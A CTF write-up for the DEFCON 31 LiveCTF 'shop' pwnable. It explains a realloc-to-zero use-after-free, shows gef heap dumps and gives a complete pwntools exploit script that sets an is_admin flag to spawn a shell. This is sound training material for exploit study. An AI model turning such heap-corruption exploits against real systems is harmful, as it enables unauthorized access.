+++
title = "DEFCON 31 LiveCTF - shop"
date = "2024-07-16"
description = "DEFCON 31 LiveCTF pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "realloc", "uaf"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/uaf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Structures
``` c
struct credential {
    char is_admin;      // alignment 때문에 어차피 8바이트를 차지
    struct shelf *shelf_ptr;
    char *username;
    char *password;
    struct credential *next_cred;
}

struct shelf {
    long count;
    struct item *item_ptr;
}

struct item {
    long number;
    long price;
    char *name;
    char *description;
}
```

### Goal
``` c
unsigned __int64 hidden_1C83()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  if ( LOBYTE(login_info_4108->is_admin) )
    system("/bin/sh");
  else
    puts("Not an admin");
  return v1 - __readfsqword(0x28u);
}
```

There's a hidden function `hidden_1C83()` that gets called when selecting option 7 from the menu after login.
Here, if the first byte of `login_info`, i.e., the value of `is_admin`, is not 0, it spawns a shell.


## 0x01. Vulnerability
``` c
unsigned __int64 add_item_1357()
{
  ...
      tmp = realloc(shelf_ptr->item_ptr, 0x20 * (shelf_ptr->count + 1));
      if ( tmp )
      {
        ++shelf_ptr->count;
        shelf_ptr->item_ptr = tmp;
        memcpy(&shelf_ptr->item_ptr[shelf_ptr->count - 1], &selected, sizeof(shelf_ptr->item_ptr[shelf_ptr->count - 1]));
      }
  ...
}

unsigned __int64 remove_item_14B6()
{
  ...
      tmp = realloc(shelf_ptr->item_ptr, 0x20 * (shelf_ptr->count - 1));
      if ( tmp )
      {
        --shelf_ptr->count;
        shelf_ptr->item_ptr = tmp;
      }
      else
      {
        puts("Error removing item");
      }
  ...
}
```

In `add_item_1357()`, when an item is added, a heap chunk is allocated to `item_ptr`.
When deleting an item in `remove_item_14B6()`, it reallocates by only reducing the chunk size, and when the size becomes 0, `realloc()` returns `NULL`.

However, the value of `shelf_ptr->item_ptr` is not initialized and remains as is, and since the freed area can be accessed when calling `add_item_1357()` again after deletion, there is a UAF vulnerability.


## 0x02. Exploit
``` c
unsigned __int64 open_account_1932()
{
  ...
      tmp = malloc(0x28uLL);
      LOBYTE(tmp->is_admin) = 0;
  ...
}
```

Looking at `open_account_1932()`, it creates an account and immediately sets `is_admin` to 0.

Therefore, I structured the exploit to add and then remove an item in account A, so that account B's `credential` struct points to the freed area by .

- open_account A
- add_item 1
- remove_item 0
- logout
- open_account B

By writing the payload in this order, I can make A's `item_ptr` and B's `credential` located in the same area, and

- login as A
- add_item 2

I thought of a scenario where after logging in as A again and adding an item, `is_admin` gets overwritten during the process of copying `item->number`, but...

``` bash
# Credential of B - BEFORE
gef➤  x/5gx 0x0000555555559330
0x555555559330: 0x0000000555555500      0x00005555555593a0
0x555555559340: 0x0000555555559360      0x0000555555559380
0x555555559350: 0x0000000000000000

# Credential of B - AFTER
gef➤  x/5gx 0x0000555555559330
0x555555559330: 0x0000000555555559      0x4ec540a62b019163
0x555555559340: 0x0000555555559360      0x0000555555559380
0x555555559350: 0x0000000000000000
```

The shell dropped, so when I checked if the value was properly overwritten, it was overwritten with a meta data of freed chunk instead of `item->number`.

Thinking carefully, there were the following issues:

1. In `remove_item_14B6()`, `realloc()` returns `NULL`, so not only is `item_ptr` not initialized, but the `count` value also doesn't decrease
2. In the process of doing `add_item_1357()` again, since the `count` value is still 1, it requests `realloc()` for 0x40
3. Not only does the size not match, but since the area where B's `credential` exists has never been `free`d again, a completely different area gets allocated

As a result, meta data gets written during the `realloc` process, overwriting `is_admin`, and fortunately the exploit succeeds.
Looks like I accidentally solved it with an unintended solution... lol


## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

BINARY = "uaf"
LIBRARY = "libc.so.6"

code_base = 0x0000555555554000
bp = {
    'main' : code_base + 0x1DC7,
    'open_account' : code_base + 0x1932,
    'hidden' : code_base + 0x1C83,
}

gs = f'''
b *{bp['open_account']}
b *{bp['hidden']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def menu(s, inputs: list) :
    for i in range(len(inputs)):
        r = s.recvuntil(b': ').decode()
        if i == 0:
            print(r.split('\n')[int(inputs[i]) - 1])
        s.sendline(inputs[i].encode())
    return

def main():
    if(len(sys.argv) > 1):
        s = remote("0.0.0.0", int(sys.argv[1]))
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    menu(s, ['2', 'aaaa', '1111'])  # open_account of A
    menu(s, ['2', '1'])             # add_item 1
    menu(s, ['3', '0'])             # remove_item 0
    menu(s, ['5'])                  # logout
    menu(s, ['2', 'bbbb', '2222'])  # open_account of B
    menu(s, ['5'])                  # logout
    menu(s, ['3', 'aaaa', '1111'])  # login as A
    menu(s, ['2', '2'])             # add_item 2
    menu(s, ['5'])                  # logout
    menu(s, ['3', 'bbbb', '2222'])  # login as B
    menu(s, ['7'])                  # hidden
    s.interactive()

if __name__=='__main__':
    main()
```